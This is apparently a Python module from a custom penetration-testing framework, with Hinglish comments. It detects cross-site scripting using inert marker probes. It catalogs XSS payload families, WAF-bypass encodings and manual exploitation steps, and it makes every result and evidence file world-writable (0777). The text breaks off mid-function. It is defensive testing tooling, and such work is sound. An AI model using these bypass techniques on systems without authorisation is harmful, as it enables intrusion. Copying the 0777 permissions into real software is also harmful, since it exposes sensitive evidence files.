#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
WASP Module: mod_xss.py  |  Phase 13 - Cross-Site Scripting (targeted, detection-only)
=======================================================================================
v13.0.0 ULTRA ULTRA PRO MAX. Authorized security testing ONLY. Scope firewall +
rate limiter + request budget + evidence + checkpoint sab wasp_core se inherit
hote hain, isliye har request scope-check, rate-limit aur budget ke andar hi
jaati hai.

KYA KARTA HAI
  Phase 12 poochta tha: "user-controlled DATA ko SERVER CODE samajh raha hai?"
  Phase 13 poochta hai: "user-controlled DATA ko BROWSER MARKUP/SCRIPT samajh
  raha hai?" -> XSS = data ko HTML/JS ke roop me interpret karne wali bug
  family (reflected / DOM / stored / mXSS / CSP-gap).
  FUNDAMENTAL DISCIPLINE (P12 handoff): blind fuzzer NAHI. P12 ka
  reflection_map.json (to_phase13_xss) + P9/P11 reflections + P2 forms + P7
  DOM analysis = seed list. Wahan targeted, context-aware probes.

STAGES (A-N)
  A  XSS surface discovery ........ P12 reflection_map (verbatim params +
                                     context) + P12/P11 feedforward xss_ripe +
                                     P9 auth_redirect_xss + P8 priority queue
                                     + P5/P7 param inventories + P2 forms
                                     (input fields) + P7 dom_analysis + hint
                                     seeds -> evidence-ranked targets (capped)
  B  Baseline & calibration ....... per-endpoint 2x GET baseline (status/len/
                                     sha1/timing) + soft-404 baseline + WAF
                                     fingerprint (canary-tag probe, capped) +
                                     CSP/security-header snapshot -> csp_map
  C  Reflection & context map ..... per-param unique canary -> verbatim vs
                                     encoded vs stripped + 16-context
                                     classifier (html-body/attr-quoted/single/
                                     unquoted/inside-tag/js-string/js-tmpl/js-
                                     raw/comment/rcdata/noscript/style/url-
                                     attr/meta-refresh/json/header/form-value)
  D  Context payload ladder ....... context ke hisaab se structural probe
                                     (SAB inert: event values = waspP13()
                                     marker function - undefined -> Reference
                                     -Error, koi network/koi real JS nahi) ->
                                     CONFIRMED/SUSPECTED/WAF_BLOCKED/SAFE
  E  WAF/filter bypass ladder ..... 24 encode/obfuscation variants (case-mix,
                                     tab/nl/ff, double+triple encode, entity
                                     w/wo semicolon, JSON \u003c, fullwidth
                                     U+FF1C, UTF-7 legacy, broken-attr parse,
                                     svg//, entity-colon, &lpar; parens, mXSS
                                     noscript-mutation, multi-close polyglot,
                                     animate/href values, srcdoc, template
                                     gadget, src-protocol-confusion...) ->
                                     winning variant record (proof detail)
  F  DOM XSS (static) ............. captured pages + capped fresh JS fetches:
                                     12 source families (location.hash/search/
                                     href, document.URL/URI/referrer, window.
                                     name, postMessage event.data, localStorage
                                     /sessionStorage, gup/deparam helpers) x
                                     22 sink families (innerHTML/outerHTML,
                                     document.write(ln), eval, Function,
                                     setTimeout/Interval-string,
                                     insertAdjacentHTML, jQuery $()/.html()/
                                     .append()/.attr('href')/..., location=,
                                     $.parseHTML, angular $sce...) + same-
                                     script source->sink link + postMessage
                                     listener-without-origin-check + deep-
                                     merge gadget hints -> dom_xss.json
  G  Stored-XSS candidates ........ cross-page canary persistence detect
                                     (A-page canary B-page me bina request ke
                                     dikhe) + form-classifier (comment/profile/
                                     bio/message fields) -> HYPOTHESIS list;
                                     live stored probe RoE-GATED (default OFF,
                                     xss_allow_stored_probe) - sirf APNE test
                                     account fields, inert marker
  H  CSP & security-header audit .. directive-level CSP parse (script-src/
                                     default-src, unsafe-inline/eval, nonce-,
                                     sha256-, wildcard, data:, object-src,
                                     base-uri, frame-ancestors, require-
                                     trusted-types) + gap -> bypass-hypothesis
                                     mapping (0 extra requests, headers se)
  I  Header-reflect XSS vectors ... Referer/UA/X-Forwarded-Host reflection in
                                     body (link-injection via XFH, inert
                                     .test TLD host) + X-Original-URL /
                                     X-Rewrite-URL path-confusion hints (P15
                                     handoff) - redirect follow KABHI nahi
  J  Encode round-trip matrix ..... per-param surviving-charset analysis:
                                     < > " ' & ( ) / = ; : me kaunsa verbatim
                                     bacha, kaunsa entity-encoded -> context
                                     exploitability ka DRIVER (ye table bina
                                     exploitability verdict adhoora hai)
  K  Famous-technique matrix ...... mXSS (noscript/style mutation), fullwidth
                                     U+FF1C normalization, UTF-7 legacy
                                     (charset-dependent), dangling-markup,
                                     <base> injection, JSON-in-<script>
                                     embedding (</ escape miss), script-
                                     gadget (template/clone), meta-refresh
                                     javascript: - probes jahan safe, warna
                                     hypothesis record (detailed steps)
  L  Framework encoding notes ..... P6/P7 mined stack -> React/Angular/Vue/
                                     Jinja auto-escape notes per context
                                     (dangerouslySetInnerHTML / v-html /
                                     bypassSecurityTrust hunts) - 0 requests
  M  Hypotheses & chains .......... ranked manual test plan + XSS chains
                                     (CSP-gap -> exploitability, stored-chain,
                                     DOM-chain, WAF-bypass-chain) + handoff
  N  Reports ...................... findings.json, xss_matrix.json/txt,
                                     XSS_FINDINGS.md, xss_test_plan.md,
                                     xss_chains.txt, TECHNIQUES_CATALOG_XSS.md,
                                     cwe_owasp_map_xss.json, 22-file MANIFEST
                                     + feedforward to_phase14/15/17/20/21/23/
                                     26/32

ULTRA PRO MAX ADDITIONS (P13) - naye + famous XSS techniques
  * Evidence-first targeting: P12 reflection map = seed (blind scan nahi).
    Jo param P12 me verbatim reflect hua wahi Stage C/D ka first target.
  * 16-context classifier: P12 ka 5-rule classifier XSS ke liye kam padta hai -
    yahan attr-quote-style, js-template-literal, rcdata, noscript, style, url-
    attr, meta-refresh, form-value, json sab mapped hain.
  * Surviving-charset matrix (stage J): payload choose karne se PEHLE pata hota
    hai kaunsa byte bachta hai - filtered params par bhi exploitability
    reasoning possible (report me proof detail).
  * Inert-marker discipline (hard rule): har event-handler value waspP13() hai
    - undefined function, execute ho to sirf ReferenceError. Koi alert(), koi
    external script src, koi exfil canary, koi real payload KABHI nahi.
  * WAF-bypass ladder 24 variants: winning variant = finding ka proof-detail
    (stage M waf-shaping ka XSS-side extension, XSS-specific vectors ke saath).
  * DOM analysis capture-based: P12 captures + apne probes sab reuse hote hain
    (0 extra requests pehle), sirf top JS files capped fetch hote hain.
  * CSP directive-level audit: 'unsafe-inline' + reflected-verbatim = DIRECT
    exploitability; nonce/sha/trusted-types = defense note. Bypass hypotheses
    (wildcard-subdomain, jsonp-allowlist) hypothesis-record me.
  * Stored XSS: sirf CANDIDATE mapping + RoE-gated own-account probe (P12 ke
    nosql_login_probe wala gate pattern) - kisi aur ka content KABHI modify
    nahi hota.
  * Sab naye stages: checkpointed, budget-capped, capture-integrated,
    RWX-guaranteed outputs (0777).

FIXES (P9-P12 ke lessons preemptively applied):
  FIX-1  probe-capture reuse: sab stage captures share hote hain -> DOM
         analysis (stage F) aur context map (stage C) ko 0 extra requests.
  FIX-2  WAF-block != SAFE: blocked responses alag verdict class
         (WAF_BLOCKED) me jaate hain aur stage E ka ranked input banate hain.
  FIX-3  soft-404 guard har diff-verdict par (catch-all template pe reflection
         diff bug nahi hota).
  FIX-4  findings checkpoint-replay par bhi derive hoti hain (har stage ka
         *_findings() cached-path par bhi chalta hai).
  FIX-5  gated POST shim (_gated_post): read_only_post=True compat + TypeError
         fallback (stored-probe path, jab ON ho).
  FIX-6  redirect probes hamesha allow_redirects=False (koi hop follow nahi).
  FIX-7  ZERO EXTERNAL EGRESS (XSS-specific hard rule): koi payload external
         host/scheme refer nahi karta; sirf waspP13 marker + reserved .test/
         .invalid TLDs; DOM fresh-fetches bhi capped (xss_dom_fetch).

VERDICT ENGINE (P12 jaisa multi-signal, false-positive kam)
  CONFIRMED   -> structural payload verbatim reflect + surviving-charset
                 context ke saath exploit-capable markup bacha (baseline me nahi)
  SUSPECTED   -> partial reflection / filter ne kuch strip kiya / single signal
  WAF_BLOCKED -> probes block hue (finding nahi, stage E input)
  NOISE       -> baseline unstable (double-fetch diff) - verdict nahi
  SAFE        -> sab dangerous chars encoded/stripped, baseline-stable

SAFETY VALVES
  * allow_active=True zaroori probes ke liye (warna discovery + offline
    hypotheses only - 0 network probes).
  * DETECTION-ONLY hard rule: koi real JS, koi exfiltration, koi cookie theft,
    koi keylogger, koi redirect-to-real-host payload nahi. Probes sirf inert
    structural markers hain jo browser me bhi kuch destructive nahi karte.
  * xss_allow_stored_probe default False (RoE gate) - stored XSS live probe
    sirf APNE test accounts par.
  * Event values sirf waspP13() - undefined identifier (sabse inert JS form).
  * Koi external TLD nahi (.test/.invalid reserved, loopback-only mindset).
  * Har stage checkpointed (Ctrl+C safe), sab caps config se tunable.
  * Evidence/details me PII REDACT hota hai (email/phone/JWT masked).
  * Sab result files RWX (0777) - RWX standing rule wrappers se guaranteed.
"""

import os
import re
import sys
import json
import time
import html
import difflib
import urllib.parse

# --- WASP v2.2 standalone path fix (auto-inserted) ---
_wasp22_dir = os.path.dirname(os.path.abspath(__file__))
if _wasp22_dir not in sys.path:
    sys.path.insert(0, _wasp22_dir)
_wasp22_p = _wasp22_dir
while _wasp22_p != os.path.dirname(_wasp22_p):
    _wasp22_p = os.path.dirname(_wasp22_p)
    if os.path.exists(os.path.join(_wasp22_p, "wasp_core.py")):
        if _wasp22_p not in sys.path:
            sys.path.insert(0, _wasp22_p)
        break
# --- end WASP v2.2 fix ---

try:
    from wasp_core import (Cfg, Scope, ScopeError, Evidence, HttpClient, Checkpoint,
                           outdir_for, now_iso, save_json, save_text, load_json,
                           rand_str, shannon_entropy, host_of, median, truncate,
                           similarity, module_ctx, write_feedforward,
                           write_manifest, soft404_baseline, is_soft404, title_of,
                           info, ok, warn, err, head, C, VERSION)
    CORE = True
except ImportError:
    CORE = False
    print("[-] wasp_core.py isi folder me hona chahiye (wasp_core.py not found).")
    print("    Ye module WASP framework ka hissa hai: python3 wasp.py run --module 13")
    print("    Ya 'python3 mod_xss.py wizard' chalao targets config karne ke liye.")
    sys.exit(1)

NAME = "xss"
PHASE = "13-xss"
PLAN_VERSION = "13.0.0"

# ===========================================================================
# RWX STANDING RULE (user memory): pentest ke SAARE result/output files ko
# read+write+execute (0777 rwxrwxrwx) permission milni chahiye.
# Ye guard core ke save_json/save_text ke upar wrapper lagata hai - isliye
# IS module ka HAR result file (json/txt/md) + uska folder hamesha rwx hoga.
# ===========================================================================
def _rwx_result(path):
    try:
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


def _rwx_save_json(path, obj):
    with open(path, "w") as f:
        json.dump(obj, f, indent=2, default=str)
    return _rwx_result(path)


def _rwx_save_text(path, text):
    with open(path, "w", errors="ignore") as f:
        f.write(text)
    return _rwx_result(path)


def _rwx_tree(root):
    if not os.path.isdir(root):
        return
    for _r, _d, _f in os.walk(root):
        for d in _d:
            _rwx_result(os.path.join(_r, d))
        for f in _f:
            _rwx_result(os.path.join(_r, f))


def _gated_post(cli, url, data=None, headers=None):
    """FIX-5: gated POST shim (stored-probe path, RoE-gated). ULTRA core par
    read_only_post=True read-gate se pass hota hai; PURANE v2 core par ye
    kwarg unsupported -> TypeError par bina kwarg fallback. str data bytes me
    encode (urllib str body reject karta hai)."""
    if isinstance(data, str):
        data = data.encode()
    try:
        return cli.request("POST", url, data=data, headers=headers,
                           read_only_post=True, allow_redirects=False)
    except TypeError:
        return cli.request("POST", url, data=data, headers=headers,
                           allow_redirects=False)
    except ScopeError:
        return None



# ===========================================================================
# STAGE M/N: MATRIX + CHAINS + HYPOTHESES + REPORTS
# ===========================================================================
def build_xss_matrix(targets, results_by_stage):
    """target x signal verdict matrix (json rows)."""
    rows = {}
    for t in targets:
        rows[(t["url"].split("?")[0], t["param"])] = {
            "url": t["url"], "param": t["param"],
            "sources": t.get("sources", []), "verdicts": {}}
    stage_col = {
        "reflect_map": "reflect", "reflected_probes": "reflected",
        "waf_bypass": "bypass", "dom_xss": "dom", "stored": "stored",
        "csp": "csp", "header_reflect": "header",
    }
    for stage, col in stage_col.items():
        for rec in results_by_stage.get(stage, {}).get("records", []):
            k = (rec.get("url", "").split("?")[0], rec.get("param") or "-")
            if k not in rows:
                rows[k] = {"url": rec.get("url", ""), "param": rec.get("param") or "-",
                           "sources": ["probe"], "verdicts": {}}
            rows[k]["verdicts"][col] = rec.get("verdict", "SAFE")
    return [rows[k] for k in rows]


def _xss_chains_text(F):
    keys = {f["key"] for f in F.items}
    out = ["WASP Phase 13 - XSS attack chains (evidence -> next move)",
           "=" * 72, ""]
    for ch in CHAIN_HINTS:
        when = ch["when"]
        if any(k in keys for k in when.split("|")):
            out.append("[TRIGGER] %s" % when)
            out.append("  THEN : %s" % ch["then"])
            out.append("  IMPACT: %s" % ch["impact"])
            out.append("")
    if len(out) <= 3:
        out.append("(koi confirmed XSS chain trigger nahi hua - "
                   "hypotheses xss_test_plan.md me hain)")
    return "\n".join(out)


def _xss_findings_md(F, conf, meta):
    lines = [
        "# Phase 13 - XSS Findings (v%s)" % PLAN_VERSION, "",
        "Target: `%s`" % meta.get("origin", "-"),
        "Generated: %s | Mode: detection-only (RoE-bounded, inert markers)" % now_iso(), "",
        "| # | Sev | Key | Endpoint | Title |", "|---|-----|-----|----------|-------|",
    ]
    for f in F.items:
        lines.append("| %s | **%s** | `%s` | %s | %s |"
                     % (f["id"], f["severity"], f["key"], f["endpoint"][:90],
                        f["title"][:80]))
    lines.append("")
    lines.append("## Kya karna hai (1-line per finding)")
    for f in F.items:
        lines.append("- **%s %s** -> %s" % (f["id"], f["key"],
                                            (f.get("why_it_matters") or "")[:200]))
    lines.append("")
    lines.append("## Payload discipline (IMPORTANT)")
    lines.append("- Har probe INERT tha: event values = `waspP13()` (undefined "
                 "function -> sirf ReferenceError). Koi real JS, koi exfil, koi "
                 "external host, koi `alert()` nagging KABHI use nahi hua.")
    lines.append("- Stored-XSS live probe RoE-gated tha (default OFF) - sirf APNE "
                 "test accounts par.")
    lines.append("")
    lines.append("> RoE reminder: detection-only run tha. Browser-side PoC demos "
                 "sirf apne session par. Har finding ka raw request/response "
                 "`evidence/` folder me hai (PII redacted).")
    return "\n".join(lines)


_XSS_CLASS_STEPS = {
    "html-body": "1) Tag-vector payload (svg-onerror family) Repeater me; "
                 "2) CSP check: unsafe-inline/no-CSP = direct PoC apne session "
                 "me; 3) nonce-CSP me nonce-leak/gadget hunt; 4) fix: output-encode.",
    "html-attr": "1) quote-breakout (\">/'>); 2) event-handler add; 3) CSP check; "
                 "4) fix: attr-aware encoding.",
    "js-string": "1) quote-breakout '; //; 2) ya </script> close; 3) CSP "
                 "script-src verify karo (unsafe-inline?); 4) fix: JSON.stringify "
                 "+ safe embed.",
    "url-attr":  "1) javascript:/entity-colon variants; 2) click-path document "
                 "karo; 3) CSP navigate-to check; 4) fix: scheme allowlist.",
    "rcdata":    "1) </textarea>/</title> close; 2) tag inject; 3) fix: raw-text "
                 "element me user-data kabhi mat daalo.",
    "comment":   "1) --> breakout; 2) mXSS round-trip check (innerHTML); "
                 "3) fix: comments me user-data nahi.",
    "noscript":  "1) </noscript> breakout; 2) mXSS check; 3) fix: noscript block "
                 "me dynamic content nahi.",
    "style":     "1) legacy expression() IE-only note; 2) modern browsers me "
                 "CSS-injection impact likho; 3) fix: CSS allowlist.",
    "dom":       "1) fragment/param me inert marker daal kar sink trigger "
                 "(browser devtools); 2) sanitizer (DOMPurify) suggest; 3) "
                 "Trusted Types CSP suggest.",
    "stored":    "1) APNE test account me marker save; 2) victim-sim session me "
                 "render dekho; 3) report me persistence path document karo.",
}


def build_xss_hypotheses(ctx, results_by_stage, targets):
    """Ranked manual test plan (evidence-first)."""
    hyps = []
    confirmed = set()
    for stage in ("reflected_probes", "waf_bypass"):
        for rec in results_by_stage.get(stage, {}).get("records", []):
            if rec.get("verdict") == "CONFIRMED":
                confirmed.add((rec["url"].split("?")[0], rec["param"]))
    for t in targets:
        key = (t["url"].split("?")[0], t["param"])
        ctxn = ""
        for rec in results_by_stage.get("reflect_map", {}).get("records", []):
            if (rec["url"].split("?")[0], rec["param"]) == key and rec.get("context"):
                ctxn = rec["context"]
                break
        cls = ctxn if ctxn in _XSS_CLASS_STEPS else \
            ("dom" if "dom" in (t.get("families") or []) else "html-body")
        steps = _XSS_CLASS_STEPS.get(cls) or _XSS_CLASS_STEPS["html-body"]
        status = "CONFIRMED-AUTO (proof ready)" if key in confirmed else \
            "HYPOTHESIS (manual follow-up)"
        hyps.append({"url": t["url"], "param": t["param"], "class": cls,
                     "status": status, "sources": t.get("sources", []),
                     "manual_steps": steps,
                     "kab": "P13 auto-run ke turant baad, isi engagement me",
                     "kahan_se": "Burp Repeater (raw requests evidence/ me)"})
    hyps.sort(key=lambda h: (0 if "CONFIRMED-AUTO" in h["status"] else 1, h["class"]))
    return hyps[:60]


def _xss_test_plan_md(hyps, conf, meta):
    lines = [
        "# Phase 13 - XSS Test Plan (manual follow-up guide)", "",
        "Fundaa: **blind fuzzer nahi** - P12 reflection-map + evidence-backed params.",
        "Auto-run budget: reflect=%d context=%d waf=%d (hard-capped)" % (
            conf.get("xss_reflect_probes", 20), conf.get("xss_context_probes", 24),
            conf.get("xss_waf_probes", 14)), "",
        "## Ranked hypotheses (CONFIRMED-AUTO pehle)",
        "",
    ]
    for i, h in enumerate(hyps, 1):
        lines.append("### %d. %s [%s] - %s" % (i, h["param"], h["class"], h["status"]))
        lines.append("- URL: `%s`" % h["url"][:140])
        lines.append("- KAB: %s" % h.get("kab", "-"))
        lines.append("- KAHAN SE: %s" % h.get("kahan_se", "-"))
        lines.append("- KAISE: %s" % h.get("manual_steps", "-"))
        lines.append("")
    lines.append("## Inert-marker discipline")
    lines.append("Browser demos me bhi marker-based payloads hi rakho "
                 "(`waspP13()`-style undefined calls). Exfil/keylogger/real-host "
                 "payload RoE written-allow ke bina KABHI nahi.")
    return "\n".join(lines)


def build_catalog_md():
    """TECHNIQUES_CATALOG_XSS.md - har stage ka payload->signal->CWE table."""
    L = ["# Phase 13 - XSS Techniques Catalog (detection-only)", "",
         "| Stage | Technique | Payload-family | Signal | CWE/OWASP |",
         "|-------|-----------|----------------|--------|-----------|"]
    rows = [
        ("C", "Reflection & context map", "waspX13 canary + char-probe pairs",
         "verbatim/context/surviving-charset", "CWE-79 / WSTG-CLNT-01"),
        ("D", "Tag-vector ladder", "svg-onload, img-onerror, details-ontoggle, "
         "video/source, marquee, autofocus-onfocus, iframe-srcdoc, svg-animate, "
         "css-animation, object/embed/form-button", "structural verbatim reflect",
         "CWE-79 / WSTG-CLNT-02"),
        ("D", "JS-string breakout", "';// \\'; </script> close", "js-context inject",
         "CWE-79 / WSTG-CLNT-03"),
        ("D", "Scheme injection", "javascript:, entity-colon, tab-embed, data:",
         "url-attr reflect", "CWE-79 / WSTG-CLNT-04"),
        ("E", "WAF bypass ladder", "case-mix, tab/nl/ff-in-tag, double/triple-encode, "
         "entity w/wo semi, JSON \\u003c, fullwidth U+FF1C, UTF-7, null-byte, "
         "broken-attr, svg//, &lpar;, comment-break, multi-close, mxss-noscript, "
         "animate-href, srcdoc-enc", "winning-variant reflect",
         "CWE-79 + WAF-evasion"),
        ("F", "DOM source->sink", "location.hash/search -> innerHTML/write/eval/"
         "jQuery $()", "static same-script link", "CWE-79 (DOM) / WSTG-CLNT-05"),
        ("F", "postMessage audit", "addEventListener('message') w/o origin-check",
         "listener-no-origin", "CWE-79 / WSTG-CLNT-06"),
        ("G", "Stored candidates", "comment/profile-class fields + RoE-gated probe",
         "cross-page echo", "CWE-79 (stored) / WSTG-CLNT-07"),
        ("H", "CSP audit", "directive-level parse", "unsafe-inline/wildcard/"
         "base-uri-missing/trusted-types", "CWE-693 (defense) / WSTG-CLNT-12"),
        ("I", "Header reflect", "Referer/UA/XFH -> body", "marker verbatim",
         "CWE-79 + CWE-113 adjacency"),
        ("J", "Surviving charset", "marker<CHAR>marker pairs", "which chars bache",
         "exploitability driver"),
        ("K", "mXSS", "noscript/style mutation", "static detect + hypothesis",
         "CWE-79 (mutation)"),
        ("K", "JSON-in-script", "</ escape miss in embedded JSON", "raw </ present",
         "CWE-79 (gadget)"),
        ("K", "Fullwidth normalization", "U+FF1C -> '<'", "normalize-reflect",
         "CWE-79 + EUC-normalization"),
        ("K", "Dangling markup", "<img src='//... swallow (RoE: hypothesis-only)",
         "hypothesis", "CWE-79 / WSTG-CLNT-09"),
        ("K", "Base-tag injection", "<base> hijack (CSP base-uri se linked)",
         "hypothesis", "CWE-79 / WSTG-CLNT-11"),
        ("L", "Framework sinks", "dangerouslySetInnerHTML / v-html / bypassTrust",
         "stack-mine notes", "CWE-79 (framework)"),
    ]
    for r in rows:
        L.append("| %s | %s | %s | %s | %s |" % r)
    L.append("")
    L.append("Payload discipline: sab payloads inert (`waspP13()` marker), koi "
             "external host/script/exfil canary KABHI. Detection-only.")
    return "\n".join(L)


CWE_OWASP_MAP_XSS = {
    "module": "mod_xss", "phase": "13-xss",
    "mappings": [
        {"key": "xss_reflected_confirmed", "cwe": "CWE-79", "owasp_wstg": "WSTG-CLNT-01",
         "owasp_top10": "A03:2021-Injection"},
        {"key": "xss_js_string_breakout", "cwe": "CWE-79", "owasp_wstg": "WSTG-CLNT-03",
         "owasp_top10": "A03:2021-Injection"},
        {"key": "xss_waf_bypassable", "cwe": "CWE-79", "owasp_wstg": "WSTG-CLNT-02",
         "owasp_top10": "A05:2021-Security-Misconfiguration"},
        {"key": "xss_dom_suspected", "cwe": "CWE-79", "owasp_wstg": "WSTG-CLNT-05",
         "owasp_top10": "A03:2021-Injection"},
        {"key": "xss_postmessage_no_origin", "cwe": "CWE-345", "owasp_wstg": "WSTG-CLNT-06",
         "owasp_top10": "A08:2021-Software-Data-Integrity-Failures"},
        {"key": "xss_stored_candidate", "cwe": "CWE-79", "owasp_wstg": "WSTG-CLNT-07",
         "owasp_top10": "A03:2021-Injection"},
        {"key": "xss_csp_missing", "cwe": "CWE-693", "owasp_wstg": "WSTG-CLNT-12",
         "owasp_top10": "A05:2021-Security-Misconfiguration"},
        {"key": "xss_header_link_injection", "cwe": "CWE-113", "owasp_wstg": "WSTG-CLNT-09",
         "owasp_top10": "A05:2021-Security-Misconfiguration"},
        {"key": "xss_json_script_embed", "cwe": "CWE-79", "owasp_wstg": "WSTG-CLNT-02",
         "owasp_top10": "A03:2021-Injection"},
    ],
}


def write_reports(out, scope, F, ctx, meta, results_by_stage, hypotheses, ranked, conf):
    """Stage N: sab result files (RWX-guaranteed) + MANIFEST."""
    # -- surface files
    _rwx_save_json(os.path.join(out, "xss_surface.json"),
                   {"meta": meta, "targets": ranked})
    _rwx_save_text(os.path.join(out, "xss_targets.txt"),
                   "\n".join("%-4s %-22s %-24s ev=%.2f  %s"
                             % (t.get("rank"), t["param"], ",".join(t.get("families", [])),
                                t.get("evidence", 0.0), t["url"]) for t in ranked))
    _rwx_save_json(os.path.join(out, "csp_map.json"), meta.get("csp_map", []))
    # -- per-stage result files
    stage_files = {
        "reflect_map": "reflection_contexts.json",
        "reflected_probes": "reflected_probes.json",
        "waf_bypass": "waf_bypass_xss.json",
        "dom_xss": "dom_xss.json",
        "stored": "stored_candidates.json",
        "csp": "csp_analysis.json",
        "header_reflect": "header_reflect_xss.json",
        "techniques": "technique_matrix.json",
    }
    for stage, fname in stage_files.items():
        res = results_by_stage.get(stage) or {"records": [], "stats": {}}
        _rwx_save_json(os.path.join(out, fname), res)
    # -- encode matrix (stage C surviving-charset ka dedicated view)
    enc_rows = []
    for rec in results_by_stage.get("reflect_map", {}).get("records", []):
        if rec.get("surviving") is not None:
            enc_rows.append({"url": rec["url"], "param": rec["param"],
                             "context": rec.get("context"),
                             "surviving": rec.get("surviving"),
                             "exploit_capable": rec.get("exploit_capable"),
                             "exploit_reason": rec.get("exploit_reason")})
    _rwx_save_json(os.path.join(out, "encode_matrix.json"), {"rows": enc_rows})
    # -- framework notes
    _rwx_save_json(os.path.join(out, "framework_notes.json"),
                   ctx.get("framework_notes") or {"frameworks": [], "notes": {}})
    # -- matrix
    rows = build_xss_matrix(ranked, results_by_stage)
    _rwx_save_json(os.path.join(out, "xss_matrix.json"), {"rows": rows})
    mtxt = ["%-10s %-18s %-8s %-9s %-7s %-5s %-4s %-7s" % (
        "TARGET", "PARAM", "REFLECT", "PAYLOAD", "BYPASS", "DOM", "CSP", "HEADER"), "-" * 100]
    for r in rows:
        v = r["verdicts"]
        short = lambda x: {"CONFIRMED": "CONFIRM", "SUSPECTED": "SUSPECT",
                           "WAF_BLOCKED": "WAF-BLK", "NOISE": "NOISE",
                           "CANDIDATE": "CANDID", "CANDIDATE-ECHO": "CANDID",
                           "SAFE": "-"}.get(x, x or "-")
        mtxt.append("%-10s %-18s %-8s %-9s %-7s %-5s %-4s %-7s" % (
            (r["url"].split("?")[0] or "-").split("//")[-1][:10], r["param"][:18],
            short(v.get("reflect")), short(v.get("reflected")),
            short(v.get("bypass")), short(v.get("dom")),
            ("weak" if v.get("csp") in ("SAFE", "SUSPECTED") and v.get("csp") else "-"),
            short(v.get("header"))))
    _rwx_save_text(os.path.join(out, "xss_matrix.txt"), "\n".join(mtxt))
    # -- docs
    _rwx_save_text(os.path.join(out, "XSS_FINDINGS.md"), _xss_findings_md(F, conf, meta))
    _rwx_save_text(os.path.join(out, "xss_test_plan.md"), _xss_test_plan_md(hypotheses, conf, meta))
    _rwx_save_text(os.path.join(out, "xss_chains.txt"), _xss_chains_text(F))
    _rwx_save_text(os.path.join(out, "TECHNIQUES_CATALOG_XSS.md"), build_catalog_md())
    _rwx_save_json(os.path.join(out, "cwe_owasp_map_xss.json"), CWE_OWASP_MAP_XSS)
    # -- findings.json
    _rwx_save_json(os.path.join(out, "findings.json"),
                   {"module": NAME, "phase": PHASE, "version": PLAN_VERSION,
                    "count": len(F.items), "findings": F.items,
                    "generated": now_iso()})
    # -- feedforward
    ripe = [r for r in results_by_stage.get("reflect_map", {}).get("records", [])
            if r.get("verbatim")][:15]
    dom_conf = [r for r in results_by_stage.get("dom_xss", {}).get("records", [])
                if r.get("same_script_link")][:8]
    stored_c = [r for r in results_by_stage.get("stored", {}).get("records", [])][:8]
    csp_weak = [r["url"] for r in results_by_stage.get("csp", {}).get("records", [])
                if r.get("gaps")][:8]
    hdr_refl = [r["url"] for r in results_by_stage.get("header_reflect", {})
                .get("records", []) if r.get("verdict") in ("CONFIRMED", "SUSPECTED")][:6]
    waf_win = [{"url": r["url"], "param": r["param"], "variant": r.get("winning_variant")}
               for r in results_by_stage.get("waf_bypass", {}).get("records", [])
               if r.get("winning_variant")][:8]
    write_feedforward(out, PHASE, {
        "to_phase14_client": {"dom_confirmed": dom_conf,
                              "ripe_reflections": ripe,
                              "note": "P14 client-side/DOM wave isi seed par"},
        "to_phase15_ssrf": {"header_url_hints": hdr_refl,
                            "note": "XFH/X-Original-URL confusion P15 me"},
        "to_phase17_api": {"json_script_embed": [r for r in
                                                 results_by_stage.get("techniques", {})
                                                 .get("records", [])
                                                 if r.get("technique") == "json-in-script-embed"
                                                 and r.get("status") == "SUSPECTED"]},
        "to_phase20_logic": {"stored_candidates": stored_c,
                             "client_pp_gadgets": [r["url"] for r in
                                                   results_by_stage.get("dom_xss", {})
                                                   .get("records", [])
                                                   if r.get("pp_gadgets")]},
        "to_phase21_authz": {"csp_weak_endpoints": csp_weak,
                             "note": "clickjacking/frame-audit P21 me"},
        "to_phase23": {"framework_notes": list((ctx.get("framework_notes") or {})
                                               .get("frameworks", []))},
        "to_phase26_cache": {"header_link_injection": hdr_refl,
                             "note": "cache-poisoning chain entry points"},
        "to_phase32_report": {"findings": len(F.items),
                              "by_severity": _sev_counts(F)},
        "xss_waf_bypasses": waf_win,
    }, notes=["detection-only run - inert markers (waspP13) discipline",
              "stored live-probe RoE-gated (default OFF)",
              "evidence PII-redacted; raw captures evidence/requests.jsonl me"])
    # -- MANIFEST
    files = ["xss_surface.json", "xss_targets.txt", "csp_map.json",
             "reflection_contexts.json", "reflected_probes.json",
             "waf_bypass_xss.json", "dom_xss.json", "stored_candidates.json",
             "csp_analysis.json", "header_reflect_xss.json",
             "technique_matrix.json", "encode_matrix.json", "framework_notes.json",
             "xss_matrix.json", "xss_matrix.txt", "XSS_FINDINGS.md",
             "xss_test_plan.md", "xss_chains.txt", "TECHNIQUES_CATALOG_XSS.md",
             "cwe_owasp_map_xss.json", "findings.json", "feedforward.json"] + \
        list(stage_files.values())
    files = sorted(set(files))
    write_manifest(out, PHASE, files,
                   stats={"targets": len(ranked), "probes_total": meta.get("probes_total", 0),
                          "findings": len(F.items),
                          "waf_map": len(meta.get("waf_map", []))})
    _rwx_tree(out)

# ===========================================================================
# MAIN RUN (stages A->N wiring, passive mode, resume-safe)
# ===========================================================================
def run(cfg, scope, base_out):
    t_start = time.time()
    out, ev, http, cp = module_ctx(cfg, scope, base_out, NAME)
    conf = dict(DEFAULTS)
    for k in list(conf.keys()):
        if hasattr(cfg, k):
            conf[k] = getattr(cfg, k)

    head("Phase 13 - XSS (detection-only, inert markers) (v%s) | %s"
         % (PLAN_VERSION, scope.describe()))
    if conf.get("xss_allow_stored_probe"):
        warn("Stored-XSS LIVE probe ON (xss_allow_stored_probe=true) - SIRF apne "
             "test accounts par. RoE check karo.")
    info("DOM fresh-fetch cap=%s | WAF budget=%s | reflect=%s ctx=%s waf=%s"
         % (conf.get("xss_dom_fetch"), conf.get("xss_waf_probe_budget"),
            conf.get("xss_reflect_probes"), conf.get("xss_context_probes"),
            conf.get("xss_waf_probes")))

    F = Findings()
    ctx = {"captures": [], "confirmed": set(), "reflect_records": [],
           "probe_records": [], "dom_records": [], "framework_notes": {},
           "base_dir": os.path.join(base_out, scope.engagement), "coverage": {}}
    meta = {"waf_probes_used": 0, "probes_total": 0, "csp_map": []}

    # ---------------- Stage A: discovery ----------------
    head("Stage A - XSS surface discovery (P12-seeded, evidence-ranked)")
    ckA = "stageA:discovery"
    if cp.is_done(ckA):
        cached = cp.result_of(ckA) or ([], {})
        ranked, disc_meta = cached[0], cached[1]
        ok("Replayed %d targets (checkpoint)" % len(ranked))
    else:
